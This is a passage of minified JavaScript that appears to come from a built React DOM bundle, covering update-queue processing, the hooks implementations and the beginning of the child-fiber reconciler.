                            Se = typeof Ot == "function" ? Ot.call(_r, ke, Se) : Ot,
                            Se == null)
                                break e;
                            ke = h({}, ke, Se);
                            break e;
                        case 2:
                            Xa = !0
                        }
                    }
                    Se = Q.callback,
                    Se !== null && (c.flags |= 64,
                    Be && (c.flags |= 8192),
                    Be = w.callbacks,
                    Be === null ? w.callbacks = [Se] : Be.push(Se))
                } else
                    Be = {
                        lane: Se,
                        tag: Q.tag,
                        payload: Q.payload,
                        callback: Q.callback,
                        next: null
                    },
                    We === null ? (ve = We = Be,
                    ce = ke) : We = We.next = Be,
                    q |= Se;
                if (Q = Q.next,
                Q === null) {
                    if (Q = w.shared.pending,
                    Q === null)
                        break;
                    Be = Q,
                    Q = Be.next,
                    Be.next = null,
                    w.lastBaseUpdate = Be,
                    w.shared.pending = null
                }
            } while (!0);
            We === null && (ce = ke),
            w.baseState = ce,
            w.firstBaseUpdate = ve,
            w.lastBaseUpdate = We,
            A === null && (w.shared.lanes = 0),
            ac |= q,
            c.lanes = q,
            c.memoizedState = ke
        }
    }
    function NP(c, u) {
        if (typeof c != "function")
            throw Error(o(191, c));
        c.call(u)
    }
    function DP(c, u) {
        var d = c.callbacks;
        if (d !== null)
            for (c.callbacks = null,
            c = 0; c < d.length; c++)
                NP(d[c], u)
    }
    var Gu = ee(null)
      , sg = ee(0);
    function FP(c, u) {
        c = ha,
        ae(sg, c),
        ae(Gu, u),
        ha = c | u.baseLanes
    }
    function aw() {
        ae(sg, ha),
        ae(Gu, Gu.current)
    }
    function cw() {
        ha = sg.current,
        ie(Gu),
        ie(sg)
    }
    var ec = 0
      , Kt = null
      , Sr = null
      , an = null
      , ag = !1
      , Ku = !1
      , gl = !1
      , cg = 0
      , Bh = 0
      , Zu = null
      , eL = 0;
    function Zr() {
        throw Error(o(321))
    }
    function lw(c, u) {
        if (u === null)
            return !1;
        for (var d = 0; d < u.length && d < c.length; d++)
            if (!Vo(c[d], u[d]))
                return !1;
        return !0
    }
    function uw(c, u, d, g, w, A) {
        return ec = A,
        Kt = u,
        u.memoizedState = null,
        u.updateQueue = null,
        u.lanes = 0,
        _.H = c === null || c.memoizedState === null ? wC : vC,
        gl = !1,
        A = d(g, w),
        gl = !1,
        Ku && (A = kP(u, d, g, w)),
        UP(c),
        A
    }
    function UP(c) {
        _.H = pg;
        var u = Sr !== null && Sr.next !== null;
        if (ec = 0,
        an = Sr = Kt = null,
        ag = !1,
        Bh = 0,
        Zu = null,
        u)
            throw Error(o(300));
        c === null || xn || (c = c.dependencies,
        c !== null && tg(c) && (xn = !0))
    }
    function kP(c, u, d, g) {
        Kt = c;
        var w = 0;
        do {
            if (Ku && (Zu = null),
            Bh = 0,
            Ku = !1,
            25 <= w)
                throw Error(o(301));
            if (w += 1,
            an = Sr = null,
            c.updateQueue != null) {
                var A = c.updateQueue;
                A.lastEffect = null,
                A.events = null,
                A.stores = null,
                A.memoCache != null && (A.memoCache.index = 0)
            }
            _.H = aL,
            A = u(d, g)
        } while (Ku);
        return A
    }
    function tL() {
        var c = _.H
          , u = c.useState()[0];
        return u = typeof u.then == "function" ? _h(u) : u,
        c = c.useState()[0],
        (Sr !== null ? Sr.memoizedState : null) !== c && (Kt.flags |= 1024),
        u
    }
    function fw() {
        var c = cg !== 0;
        return cg = 0,
        c
    }
    function dw(c, u, d) {
        u.updateQueue = c.updateQueue,
        u.flags &= -2053,
        c.lanes &= ~d
    }
    function hw(c) {
        if (ag) {
            for (c = c.memoizedState; c !== null; ) {
                var u = c.queue;
                u !== null && (u.pending = null),
                c = c.next
            }
            ag = !1
        }
        ec = 0,
        an = Sr = Kt = null,
        Ku = !1,
        Bh = cg = 0,
        Zu = null
    }
    function Eo() {
        var c = {
            memoizedState: null,
            baseState: null,
            baseQueue: null,
            queue: null,
            next: null
        };
        return an === null ? Kt.memoizedState = an = c : an = an.next = c,
        an
    }
    function cn() {
        if (Sr === null) {
            var c = Kt.alternate;
            c = c !== null ? c.memoizedState : null
        } else
            c = Sr.next;
        var u = an === null ? Kt.memoizedState : an.next;
        if (u !== null)
            an = u,
            Sr = c;
        else {
            if (c === null)
                throw Kt.alternate === null ? Error(o(467)) : Error(o(310));
            Sr = c,
            c = {
                memoizedState: Sr.memoizedState,
                baseState: Sr.baseState,
                baseQueue: Sr.baseQueue,
                queue: Sr.queue,
                next: null
            },
            an === null ? Kt.memoizedState = an = c : an = an.next = c
        }
        return an
    }
    function pw() {
        return {
            lastEffect: null,
            events: null,
            stores: null,
            memoCache: null
        }
    }
    function _h(c) {
        var u = Bh;
        return Bh += 1,
        Zu === null && (Zu = []),
        c = RP(Zu, c, u),
        u = Kt,
        (an === null ? u.memoizedState : an.next) === null && (u = u.alternate,
        _.H = u === null || u.memoizedState === null ? wC : vC),
        c
    }
    function lg(c) {
        if (c !== null && typeof c == "object") {
            if (typeof c.then == "function")
                return _h(c);
            if (c.$$typeof === O)
                return Gn(c)
        }
        throw Error(o(438, String(c)))
    }
    function gw(c) {
        var u = null
          , d = Kt.updateQueue;
        if (d !== null && (u = d.memoCache),
        u == null) {
            var g = Kt.alternate;
            g !== null && (g = g.updateQueue,
            g !== null && (g = g.memoCache,
            g != null && (u = {
                data: g.data.map(function(w) {
                    return w.slice()
                }),
                index: 0
            })))
        }
        if (u == null && (u = {
            data: [],
            index: 0
        }),
        d === null && (d = pw(),
        Kt.updateQueue = d),
        d.memoCache = u,
        d = u.data[u.index],
        d === void 0)
            for (d = u.data[u.index] = Array(c),
            g = 0; g < c; g++)
                d[g] = k;
        return u.index++,
        d
    }
    function aa(c, u) {
        return typeof u == "function" ? u(c) : u
    }
    function ug(c) {
        var u = cn();
        return yw(u, Sr, c)
    }
    function yw(c, u, d) {
        var g = c.queue;
        if (g === null)
            throw Error(o(311));
        g.lastRenderedReducer = d;
        var w = c.baseQueue
          , A = g.pending;
        if (A !== null) {
            if (w !== null) {
                var q = w.next;
                w.next = A.next,
                A.next = q
            }
            u.baseQueue = w = A,
            g.pending = null
        }
        if (A = c.baseState,
        w === null)
            c.memoizedState = A;
        else {
            u = w.next;
            var Q = q = null
              , ce = null
              , ve = u
              , We = !1;
            do {
                var ke = ve.lane & -536870913;
                if (ke !== ve.lane ? (lr & ke) === ke : (ec & ke) === ke) {
                    var Se = ve.revertLane;
                    if (Se === 0)
                        ce !== null && (ce = ce.next = {
                            lane: 0,
                            revertLane: 0,
                            action: ve.action,
                            hasEagerState: ve.hasEagerState,
                            eagerState: ve.eagerState,
                            next: null
                        }),
                        ke === Vu && (We = !0);
                    else if ((ec & Se) === Se) {
                        ve = ve.next,
                        Se === Vu && (We = !0);
                        continue
                    } else
                        ke = {
                            lane: 0,
                            revertLane: ve.revertLane,
                            action: ve.action,
                            hasEagerState: ve.hasEagerState,
                            eagerState: ve.eagerState,
                            next: null
                        },
                        ce === null ? (Q = ce = ke,
                        q = A) : ce = ce.next = ke,
                        Kt.lanes |= Se,
                        ac |= Se;
                    ke = ve.action,
                    gl && d(A, ke),
                    A = ve.hasEagerState ? ve.eagerState : d(A, ke)
                } else
                    Se = {
                        lane: ke,
                        revertLane: ve.revertLane,
                        action: ve.action,
                        hasEagerState: ve.hasEagerState,
                        eagerState: ve.eagerState,
                        next: null
                    },
                    ce === null ? (Q = ce = Se,
                    q = A) : ce = ce.next = Se,
                    Kt.lanes |= ke,
                    ac |= ke;
                ve = ve.next
            } while (ve !== null && ve !== u);
            if (ce === null ? q = A : ce.next = Q,
            !Vo(A, c.memoizedState) && (xn = !0,
            We && (d = Hu,
            d !== null)))
                throw d;
            c.memoizedState = A,
            c.baseState = q,
            c.baseQueue = ce,
            g.lastRenderedState = A
        }
        return w === null && (g.lanes = 0),
        [c.memoizedState, g.dispatch]
    }
    function bw(c) {
        var u = cn()
          , d = u.queue;
        if (d === null)
            throw Error(o(311));
        d.lastRenderedReducer = c;
        var g = d.dispatch
          , w = d.pending
          , A = u.memoizedState;
        if (w !== null) {
            d.pending = null;
            var q = w = w.next;
            do
                A = c(A, q.action),
                q = q.next;
            while (q !== w);
            Vo(A, u.memoizedState) || (xn = !0),
            u.memoizedState = A,
            u.baseQueue === null && (u.baseState = A),
            d.lastRenderedState = A
        }
        return [A, g]
    }
    function LP(c, u, d) {
        var g = Kt
          , w = cn()
          , A = xr;
        if (A) {
            if (d === void 0)
                throw Error(o(407));
            d = d()
        } else
            d = u();
        var q = !Vo((Sr || w).memoizedState, d);
        q && (w.memoizedState = d,
        xn = !0),
        w = w.queue;
        var Q = jP.bind(null, g, w, c);
        if (Ih(2048, 8, Q, [c]),
        w.getSnapshot !== u || q || an !== null && an.memoizedState.tag & 1) {
            if (g.flags |= 2048,
            Yu(9, fg(), zP.bind(null, g, w, d, u), null),
            Fr === null)
                throw Error(o(349));
            A || (ec & 124) !== 0 || $P(g, u, d)
        }
        return d
    }
    function $P(c, u, d) {
        c.flags |= 16384,
        c = {
            getSnapshot: u,
            value: d
        },
        u = Kt.updateQueue,
        u === null ? (u = pw(),
        Kt.updateQueue = u,
        u.stores = [c]) : (d = u.stores,
        d === null ? u.stores = [c] : d.push(c))
    }
    function zP(c, u, d, g) {
        u.value = d,
        u.getSnapshot = g,
        qP(u) && VP(c)
    }
    function jP(c, u, d) {
        return d(function() {
            qP(u) && VP(c)
        })
    }
    function qP(c) {
        var u = c.getSnapshot;
        c = c.value;
        try {
            var d = u();
            return !Vo(c, d)
        } catch {
            return !0
        }
    }
    function VP(c) {
        var u = $u(c, 2);
        u !== null && Xo(u, c, 2)
    }
    function mw(c) {
        var u = Eo();
        if (typeof c == "function") {
            var d = c;
            if (c = d(),
            gl) {
                N(!0);
                try {
                    d()
                } finally {
                    N(!1)
                }
            }
        }
        return u.memoizedState = u.baseState = c,
        u.queue = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: aa,
            lastRenderedState: c
        },
        u
    }
    function HP(c, u, d, g) {
        return c.baseState = d,
        yw(c, Sr, typeof g == "function" ? g : aa)
    }
    function rL(c, u, d, g, w) {
        if (hg(c))
            throw Error(o(485));
        if (c = u.action,
        c !== null) {
            var A = {
                payload: w,
                action: c,
                next: null,
                isTransition: !0,
                status: "pending",
                value: null,
                reason: null,
                listeners: [],
                then: function(q) {
                    A.listeners.push(q)
                }
            };
            _.T !== null ? d(!0) : A.isTransition = !1,
            g(A),
            d = u.pending,
            d === null ? (A.next = u.pending = A,
            GP(u, A)) : (A.next = d.next,
            u.pending = d.next = A)
        }
    }
    function GP(c, u) {
        var d = u.action
          , g = u.payload
          , w = c.state;
        if (u.isTransition) {
            var A = _.T
              , q = {};
            _.T = q;
            try {
                var Q = d(w, g)
                  , ce = _.S;
                ce !== null && ce(q, Q),
                KP(c, u, Q)
            } catch (ve) {
                xw(c, u, ve)
            } finally {
                _.T = A
            }
        } else
            try {
                A = d(w, g),
                KP(c, u, A)
            } catch (ve) {
                xw(c, u, ve)
            }
    }
    function KP(c, u, d) {
        d !== null && typeof d == "object" && typeof d.then == "function" ? d.then(function(g) {
            ZP(c, u, g)
        }, function(g) {
            return xw(c, u, g)
        }) : ZP(c, u, d)
    }
    function ZP(c, u, d) {
        u.status = "fulfilled",
        u.value = d,
        YP(u),
        c.state = d,
        u = c.pending,
        u !== null && (d = u.next,
        d === u ? c.pending = null : (d = d.next,
        u.next = d,
        GP(c, d)))
    }
    function xw(c, u, d) {
        var g = c.pending;
        if (c.pending = null,
        g !== null) {
            g = g.next;
            do
                u.status = "rejected",
                u.reason = d,
                YP(u),
                u = u.next;
            while (u !== g)
        }
        c.action = null
    }
    function YP(c) {
        c = c.listeners;
        for (var u = 0; u < c.length; u++)
            (0,
            c[u])()
    }
    function XP(c, u) {
        return u
    }
    function JP(c, u) {
        if (xr) {
            var d = Fr.formState;
            if (d !== null) {
                e: {
                    var g = Kt;
                    if (xr) {
                        if (Gr) {
                            t: {
                                for (var w = Gr, A = xs; w.nodeType !== 8; ) {
                                    if (!A) {
                                        w = null;
                                        break t
                                    }
                                    if (w = Hi(w.nextSibling),
                                    w === null) {
                                        w = null;
                                        break t
                                    }
                                }
                                A = w.data,
                                w = A === "F!" || A === "F" ? w : null
                            }
                            if (w) {
                                Gr = Hi(w.nextSibling),
                                g = w.data === "F!";
                                break e
                            }
                        }
                        fl(g)
                    }
                    g = !1
                }
                g && (u = d[0])
            }
        }
        return d = Eo(),
        d.memoizedState = d.baseState = u,
        g = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: XP,
            lastRenderedState: u
        },
        d.queue = g,
        d = bC.bind(null, Kt, g),
        g.dispatch = d,
        g = mw(!1),
        A = Aw.bind(null, Kt, !1, g.queue),
        g = Eo(),
        w = {
            state: u,
            dispatch: null,
            action: c,
            pending: null
        },
        g.queue = w,
        d = rL.bind(null, Kt, w, A, d),
        w.dispatch = d,
        g.memoizedState = c,
        [u, d, !1]
    }
    function QP(c) {
        var u = cn();
        return eC(u, Sr, c)
    }
    function eC(c, u, d) {
        if (u = yw(c, u, XP)[0],
        c = ug(aa)[0],
        typeof u == "object" && u !== null && typeof u.then == "function")
            try {
                var g = _h(u)
            } catch (q) {
                throw q === Eh ? og : q
            }
        else
            g = u;
        u = cn();
        var w = u.queue
          , A = w.dispatch;
        return d !== u.memoizedState && (Kt.flags |= 2048,
        Yu(9, fg(), nL.bind(null, w, d), null)),
        [g, A, c]
    }
    function nL(c, u) {
        c.action = u
    }
    function tC(c) {
        var u = cn()
          , d = Sr;
        if (d !== null)
            return eC(u, d, c);
        cn(),
        u = u.memoizedState,
        d = cn();
        var g = d.queue.dispatch;
        return d.memoizedState = c,
        [u, g, !1]
    }
    function Yu(c, u, d, g) {
        return c = {
            tag: c,
            create: d,
            deps: g,
            inst: u,
            next: null
        },
        u = Kt.updateQueue,
        u === null && (u = pw(),
        Kt.updateQueue = u),
        d = u.lastEffect,
        d === null ? u.lastEffect = c.next = c : (g = d.next,
        d.next = c,
        c.next = g,
        u.lastEffect = c),
        c
    }
    function fg() {
        return {
            destroy: void 0,
            resource: void 0
        }
    }
    function rC() {
        return cn().memoizedState
    }
    function dg(c, u, d, g) {
        var w = Eo();
        g = g === void 0 ? null : g,
        Kt.flags |= c,
        w.memoizedState = Yu(1 | u, fg(), d, g)
    }
    function Ih(c, u, d, g) {
        var w = cn();
        g = g === void 0 ? null : g;
        var A = w.memoizedState.inst;
        Sr !== null && g !== null && lw(g, Sr.memoizedState.deps) ? w.memoizedState = Yu(u, A, d, g) : (Kt.flags |= c,
        w.memoizedState = Yu(1 | u, A, d, g))
    }
    function nC(c, u) {
        dg(8390656, 8, c, u)
    }
    function oC(c, u) {
        Ih(2048, 8, c, u)
    }
    function iC(c, u) {
        return Ih(4, 2, c, u)
    }
    function sC(c, u) {
        return Ih(4, 4, c, u)
    }
    function aC(c, u) {
        if (typeof u == "function") {
            c = c();
            var d = u(c);
            return function() {
                typeof d == "function" ? d() : u(null)
            }
        }
        if (u != null)
            return c = c(),
            u.current = c,
            function() {
                u.current = null
            }
    }
    function cC(c, u, d) {
        d = d != null ? d.concat([c]) : null,
        Ih(4, 4, aC.bind(null, u, c), d)
    }
    function ww() {}
    function lC(c, u) {
        var d = cn();
        u = u === void 0 ? null : u;
        var g = d.memoizedState;
        return u !== null && lw(u, g[1]) ? g[0] : (d.memoizedState = [c, u],
        c)
    }
    function uC(c, u) {
        var d = cn();
        u = u === void 0 ? null : u;
        var g = d.memoizedState;
        if (u !== null && lw(u, g[1]))
            return g[0];
        if (g = c(),
        gl) {
            N(!0);
            try {
                c()
            } finally {
                N(!1)
            }
        }
        return d.memoizedState = [g, u],
        g
    }
    function vw(c, u, d) {
        return d === void 0 || (ec & 1073741824) !== 0 ? c.memoizedState = u : (c.memoizedState = d,
        c = h6(),
        Kt.lanes |= c,
        ac |= c,
        d)
    }
    function fC(c, u, d, g) {
        return Vo(d, u) ? d : Gu.current !== null ? (c = vw(c, d, g),
        Vo(c, u) || (xn = !0),
        c) : (ec & 42) === 0 ? (xn = !0,
        c.memoizedState = d) : (c = h6(),
        Kt.lanes |= c,
        ac |= c,
        u)
    }
    function dC(c, u, d, g, w) {
        var A = $.p;
        $.p = A !== 0 && 8 > A ? A : 8;
        var q = _.T
          , Q = {};
        _.T = Q,
        Aw(c, !1, u, d);
        try {
            var ce = w()
              , ve = _.S;
            if (ve !== null && ve(Q, ce),
            ce !== null && typeof ce == "object" && typeof ce.then == "function") {
                var We = Qk(ce, g);
                Oh(c, u, We, Yo(c))
            } else
                Oh(c, u, g, Yo(c))
        } catch (ke) {
            Oh(c, u, {
                then: function() {},
                status: "rejected",
                reason: ke
            }, Yo())
        } finally {
            $.p = A,
            _.T = q
        }
    }
    function oL() {}
    function Tw(c, u, d, g) {
        if (c.tag !== 5)
            throw Error(o(476));
        var w = hC(c).queue;
        dC(c, w, u, z, d === null ? oL : function() {
            return pC(c),
            d(g)
        }
        )
    }
    function hC(c) {
        var u = c.memoizedState;
        if (u !== null)
            return u;
        u = {
            memoizedState: z,
            baseState: z,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: aa,
                lastRenderedState: z
            },
            next: null
        };
        var d = {};
        return u.next = {
            memoizedState: d,
            baseState: d,
            baseQueue: null,
            queue: {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: aa,
                lastRenderedState: d
            },
            next: null
        },
        c.memoizedState = u,
        c = c.alternate,
        c !== null && (c.memoizedState = u),
        u
    }
    function pC(c) {
        var u = hC(c).next.queue;
        Oh(c, u, {}, Yo())
    }
    function Ew() {
        return Gn(Zh)
    }
    function gC() {
        return cn().memoizedState
    }
    function yC() {
        return cn().memoizedState
    }
    function iL(c) {
        for (var u = c.return; u !== null; ) {
            switch (u.tag) {
            case 24:
            case 3:
                var d = Yo();
                c = Ja(d);
                var g = Qa(u, c, d);
                g !== null && (Xo(g, u, d),
                Ph(g, u, d)),
                u = {
                    cache: Qx()
                },
                c.payload = u;
                return
            }
            u = u.return
        }
    }
    function sL(c, u, d) {
        var g = Yo();
        d = {
            lane: g,
            revertLane: 0,
            action: d,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        hg(c) ? mC(u, d) : (d = jx(c, u, d, g),
        d !== null && (Xo(d, c, g),
        xC(d, u, g)))
    }
    function bC(c, u, d) {
        var g = Yo();
        Oh(c, u, d, g)
    }
    function Oh(c, u, d, g) {
        var w = {
            lane: g,
            revertLane: 0,
            action: d,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
        if (hg(c))
            mC(u, w);
        else {
            var A = c.alternate;
            if (c.lanes === 0 && (A === null || A.lanes === 0) && (A = u.lastRenderedReducer,
            A !== null))
                try {
                    var q = u.lastRenderedState
                      , Q = A(q, d);
                    if (w.hasEagerState = !0,
                    w.eagerState = Q,
                    Vo(Q, q))
                        return Y0(c, u, w, 0),
                        Fr === null && Z0(),
                        !1
                } catch {} finally {}
            if (d = jx(c, u, w, g),
            d !== null)
                return Xo(d, c, g),
                xC(d, u, g),
                !0
        }
        return !1
    }
    function Aw(c, u, d, g) {
        if (g = {
            lane: 2,
            revertLane: rv(),
            action: g,
            hasEagerState: !1,
            eagerState: null,
            next: null
        },
        hg(c)) {
            if (u)
                throw Error(o(479))
        } else
            u = jx(c, d, g, 2),
            u !== null && Xo(u, c, 2)
    }
    function hg(c) {
        var u = c.alternate;
        return c === Kt || u !== null && u === Kt
    }
    function mC(c, u) {
        Ku = ag = !0;
        var d = c.pending;
        d === null ? u.next = u : (u.next = d.next,
        d.next = u),
        c.pending = u
    }
    function xC(c, u, d) {
        if ((d & 4194048) !== 0) {
            var g = u.lanes;
            g &= c.pendingLanes,
            d |= g,
            u.lanes = d,
            jr(c, d)
        }
    }
    var pg = {
        readContext: Gn,
        use: lg,
        useCallback: Zr,
        useContext: Zr,
        useEffect: Zr,
        useImperativeHandle: Zr,
        useLayoutEffect: Zr,
        useInsertionEffect: Zr,
        useMemo: Zr,
        useReducer: Zr,
        useRef: Zr,
        useState: Zr,
        useDebugValue: Zr,
        useDeferredValue: Zr,
        useTransition: Zr,
        useSyncExternalStore: Zr,
        useId: Zr,
        useHostTransitionStatus: Zr,
        useFormState: Zr,
        useActionState: Zr,
        useOptimistic: Zr,
        useMemoCache: Zr,
        useCacheRefresh: Zr
    }
      , wC = {
        readContext: Gn,
        use: lg,
        useCallback: function(c, u) {
            return Eo().memoizedState = [c, u === void 0 ? null : u],
            c
        },
        useContext: Gn,
        useEffect: nC,
        useImperativeHandle: function(c, u, d) {
            d = d != null ? d.concat([c]) : null,
            dg(4194308, 4, aC.bind(null, u, c), d)
        },
        useLayoutEffect: function(c, u) {
            return dg(4194308, 4, c, u)
        },
        useInsertionEffect: function(c, u) {
            dg(4, 2, c, u)
        },
        useMemo: function(c, u) {
            var d = Eo();
            u = u === void 0 ? null : u;
            var g = c();
            if (gl) {
                N(!0);
                try {
                    c()
                } finally {
                    N(!1)
                }
            }
            return d.memoizedState = [g, u],
            g
        },
        useReducer: function(c, u, d) {
            var g = Eo();
            if (d !== void 0) {
                var w = d(u);
                if (gl) {
                    N(!0);
                    try {
                        d(u)
                    } finally {
                        N(!1)
                    }
                }
            } else
                w = u;
            return g.memoizedState = g.baseState = w,
            c = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: c,
                lastRenderedState: w
            },
            g.queue = c,
            c = c.dispatch = sL.bind(null, Kt, c),
            [g.memoizedState, c]
        },
        useRef: function(c) {
            var u = Eo();
            return c = {
                current: c
            },
            u.memoizedState = c
        },
        useState: function(c) {
            c = mw(c);
            var u = c.queue
              , d = bC.bind(null, Kt, u);
            return u.dispatch = d,
            [c.memoizedState, d]
        },
        useDebugValue: ww,
        useDeferredValue: function(c, u) {
            var d = Eo();
            return vw(d, c, u)
        },
        useTransition: function() {
            var c = mw(!1);
            return c = dC.bind(null, Kt, c.queue, !0, !1),
            Eo().memoizedState = c,
            [!1, c]
        },
        useSyncExternalStore: function(c, u, d) {
            var g = Kt
              , w = Eo();
            if (xr) {
                if (d === void 0)
                    throw Error(o(407));
                d = d()
            } else {
                if (d = u(),
                Fr === null)
                    throw Error(o(349));
                (lr & 124) !== 0 || $P(g, u, d)
            }
            w.memoizedState = d;
            var A = {
                value: d,
                getSnapshot: u
            };
            return w.queue = A,
            nC(jP.bind(null, g, A, c), [c]),
            g.flags |= 2048,
            Yu(9, fg(), zP.bind(null, g, A, d, u), null),
            d
        },
        useId: function() {
            var c = Eo()
              , u = Fr.identifierPrefix;
            if (xr) {
                var d = oa
                  , g = na;
                d = (g & ~(1 << 32 - U(g) - 1)).toString(32) + d,
                u = "" + u + "R" + d,
                d = cg++,
                0 < d && (u += "H" + d.toString(32)),
                u += ""
            } else
                d = eL++,
                u = "" + u + "r" + d.toString(32) + "";
            return c.memoizedState = u
        },
        useHostTransitionStatus: Ew,
        useFormState: JP,
        useActionState: JP,
        useOptimistic: function(c) {
            var u = Eo();
            u.memoizedState = u.baseState = c;
            var d = {
                pending: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: null,
                lastRenderedState: null
            };
            return u.queue = d,
            u = Aw.bind(null, Kt, !0, d),
            d.dispatch = u,
            [c, u]
        },
        useMemoCache: gw,
        useCacheRefresh: function() {
            return Eo().memoizedState = iL.bind(null, Kt)
        }
    }
      , vC = {
        readContext: Gn,
        use: lg,
        useCallback: lC,
        useContext: Gn,
        useEffect: oC,
        useImperativeHandle: cC,
        useInsertionEffect: iC,
        useLayoutEffect: sC,
        useMemo: uC,
        useReducer: ug,
        useRef: rC,
        useState: function() {
            return ug(aa)
        },
        useDebugValue: ww,
        useDeferredValue: function(c, u) {
            var d = cn();
            return fC(d, Sr.memoizedState, c, u)
        },
        useTransition: function() {
            var c = ug(aa)[0]
              , u = cn().memoizedState;
            return [typeof c == "boolean" ? c : _h(c), u]
        },
        useSyncExternalStore: LP,
        useId: gC,
        useHostTransitionStatus: Ew,
        useFormState: QP,
        useActionState: QP,
        useOptimistic: function(c, u) {
            var d = cn();
            return HP(d, Sr, c, u)
        },
        useMemoCache: gw,
        useCacheRefresh: yC
    }
      , aL = {
        readContext: Gn,
        use: lg,
        useCallback: lC,
        useContext: Gn,
        useEffect: oC,
        useImperativeHandle: cC,
        useInsertionEffect: iC,
        useLayoutEffect: sC,
        useMemo: uC,
        useReducer: bw,
        useRef: rC,
        useState: function() {
            return bw(aa)
        },
        useDebugValue: ww,
        useDeferredValue: function(c, u) {
            var d = cn();
            return Sr === null ? vw(d, c, u) : fC(d, Sr.memoizedState, c, u)
        },
        useTransition: function() {
            var c = bw(aa)[0]
              , u = cn().memoizedState;
            return [typeof c == "boolean" ? c : _h(c), u]
        },
        useSyncExternalStore: LP,
        useId: gC,
        useHostTransitionStatus: Ew,
        useFormState: tC,
        useActionState: tC,
        useOptimistic: function(c, u) {
            var d = cn();
            return Sr !== null ? HP(d, Sr, c, u) : (d.baseState = c,
            [c, d.queue.dispatch])
        },
        useMemoCache: gw,
        useCacheRefresh: yC
    }
      , Xu = null
      , Rh = 0;
    function gg(c) {
        var u = Rh;
        return Rh += 1,
        Xu === null && (Xu = []),
        RP(Xu, c, u)
    }
    function Wh(c, u) {
        u = u.props.ref,
        c.ref = u !== void 0 ? u : null
    }
    function yg(c, u) {
        throw u.$$typeof === p ? Error(o(525)) : (c = Object.prototype.toString.call(u),
        Error(o(31, c === "[object Object]" ? "object with keys {" + Object.keys(u).join(", ") + "}" : c)))
    }
    function TC(c) {
        var u = c._init;
        return u(c._payload)
    }
    function EC(c) {
        function u(ge, de) {
            if (c) {
                var xe = ge.deletions;
                xe === null ? (ge.deletions = [de],
                ge.flags |= 16) : xe.push(de)
            }
        }
        function d(ge, de) {
            if (!c)
                return null;
            for (; de !== null; )
                u(ge, de),
                de = de.sibling;
            return null
        }
        function g(ge) {
            for (var de = new Map; ge !== null; )
                ge.key !== null ? de.set(ge.key, ge) : de.set(ge.index, ge),
                ge = ge.sibling;
            return de
        }
        function w(ge, de) {
            return ge = ra(ge, de),
            ge.index = 0,
            ge.sibling = null,
            ge
        }
        function A(ge, de, xe) {
            return ge.index = xe,
            c ? (xe = ge.alternate,
            xe !== null ? (xe = xe.index,
            xe < de ? (ge.flags |= 67108866,
            de) : xe) : (ge.flags |= 67108866,
            de)) : (ge.flags |= 1048576,
            de)
        }
        function q(ge) {
            return c && ge.alternate === null && (ge.flags |= 67108866),
            ge
        }
        function Q(ge, de, xe, Me) {
            return de === null || de.tag !== 6 ? (de = Vx(xe, ge.mode, Me),
            de.return = ge,
            de) : (de = w(de, xe),
            de.return = ge,
            de)
        }
        function ce(ge, de, xe, Me) {
            var ut = xe.type;
            return ut === T ? We(ge, de, xe.props.children, Me, xe.key) : de !== null && (de.elementType === ut || typeof ut == "object" && ut !== null && ut.$$typeof === C && TC(ut) === de.type) ? (de = w(de, xe.props),
            Wh(de, xe),
            de.return = ge,
            de) : (de = J0(xe.type, xe.key, xe.props, null, ge.mode, Me),
            Wh(de, xe),
            de.return = ge,
            de)
        }
        function ve(ge, de, xe, Me) {
            return de === null || de.tag !== 4 || de.stateNode.containerInfo !== xe.containerInfo || de.stateNode.implementation !== xe.implementation ? (de = Hx(xe, ge.mode, Me),
            de.return = ge,
            de) : (de = w(de, xe.children || []),
            de.return = ge,
            de)
        }
        function We(ge, de, xe, Me, ut) {
            return de === null || de.tag !== 7 ? (de = al(xe, ge.mode, Me, ut),
            de.return = ge,
            de) : (de = w(de, xe),
            de.return = ge,
            de)
        }
        function ke(ge, de, xe) {
            if (typeof de == "string" && de !== "" || typeof de == "number" || typeof de == "bigint")
                return de = Vx("" + de, ge.mode, xe),
                de.return = ge,
                de;
            if (typeof de == "object" && de !== null) {
                switch (de.$$typeof) {
                case b:
                    return xe = J0(de.type, de.key, de.props, null, ge.mode, xe),
                    Wh(xe, de),
                    xe.return = ge,
                    xe;
                case v:
                    return de = Hx(de, ge.mode, xe),
                    de.return = ge,
                    de;
                case C:
                    var Me = de._init;
                    return de = Me(de._payload),
                    ke(ge, de, xe)
                }
                if (R(de) || X(de))
                    return de = al(de, ge.mode, xe, null),
                    de.return = ge,
                    de;
                if (typeof de.then == "function")
                    return ke(ge, gg(de), xe);
                if (de.$$typeof === O)
                    return ke(ge, rg(ge, de), xe);
                yg(ge, de)
            }
            return null
        }
        function Se(ge, de, xe, Me) {
            var ut = de !== null ? de.key : null;
            if (typeof xe == "string" && xe !== "" || typeof xe == "number" || typeof xe == "bigint")
                return ut !== null ? null : Q(ge, de, "" + xe, Me);
            if (typeof xe == "object" && xe !== null) {
                switch (xe.$$typeof) {
                case b:
                    return xe.key === ut ? ce(ge, de, xe, Me) : null;
                case v:
                    return xe.key === ut ? ve(ge, de, xe, Me) : null;
                case C:
                    return ut = xe._init,
                    xe = ut(xe._payload),
                    Se(ge, de, xe, Me)
                }
                if (R(xe) || X(xe))
                    return ut !== null ? null : We(ge, de, xe, Me, null);
                if (typeof xe.then == "function")
                    return Se(ge, de, gg(xe), Me);
                if (xe.$$typeof === O)
                    return Se(ge, de, rg(ge, xe), Me);
                yg(ge, xe)
            }
            return null
        }
        function Be(ge, de, xe, Me, ut) {
            if (typeof Me == "string" && Me !== "" || typeof Me == "number" || typeof Me == "bigint")
                return ge = ge.get(xe) || null,
                Q(de, ge, "" + Me, ut);
            if (typeof Me == "object" && Me !== null) {
                switch (Me.$$typeof) {
                case b:
                    return ge = ge.get(Me.key === null ? xe : Me.key) || null,
                    ce(de, ge, Me, ut);
                case v:
                    return ge = ge.get(Me.key === null ? xe : Me.key) || null,
                    ve(de, ge, Me, ut);
                case C:
                    var Xt = Me._init;
                    return Me = Xt(Me._payload),
                    Be(ge, de, xe, Me, ut)
                }
                if (R(Me) || X(Me))
